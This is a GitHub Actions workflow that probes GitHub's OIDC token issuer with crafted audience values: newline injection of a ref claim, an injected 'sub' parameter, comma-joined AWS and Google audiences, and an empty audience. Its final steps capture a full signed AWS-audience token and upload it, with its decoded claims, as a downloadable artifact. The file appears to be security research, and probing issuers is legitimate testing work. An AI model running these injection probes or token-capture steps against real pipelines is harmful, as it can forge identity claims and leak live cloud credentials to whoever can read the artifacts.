name: OIDC Push Audience Test
on:
  push:
    branches: [main]
    paths: ['trigger.txt']
permissions:
  contents: read
  id-token: write
jobs:
  audience-test:
    runs-on: ubuntu-latest
    steps:
      - name: Test 1 - Standard audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 1 Standard ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('aud:', repr(c.get('aud')))
print('sub:', c.get('sub'))
print('event:', c.get('event_name'))"

      - name: Test 2 - Newline injection in audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" | jq -r .value)
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 2 Newline injection ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
  print('sub:', c.get('sub'))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "REJECTED/FAILED"

      - name: Test 3 - Sub parameter injection
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=INJECTED" | jq -r .value)
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 3 Sub param injection ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
  print('sub:', repr(c.get('sub')))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "REJECTED/FAILED"

      - name: Test 4 - Comma-separated audiences
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%2Chttps%3A%2F%2Faccounts.google.com" | jq -r .value)
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 4 Comma audience ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "REJECTED/FAILED"

      - name: Test 5 - Empty audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=" | jq -r .value)
          P=$(echo "$T" | cut -d. -f2)
          echo "=== Test 5 Empty audience ==="
          echo "$P" | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
  print('sub:', c.get('sub'))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "REJECTED/FAILED"

      - name: Capture full token
        run: |
          FULL=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$FULL" > /tmp/push_token.txt
          echo "$FULL" | cut -d. -f2 | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))" > /tmp/push_token_payload.json
          cat /tmp/push_token_payload.json

      - uses: actions/upload-artifact@v4
        with:
          name: push-oidc-audience-results
          path: |
            /tmp/push_token.txt
            /tmp/push_token_payload.json
          retention-days: 1
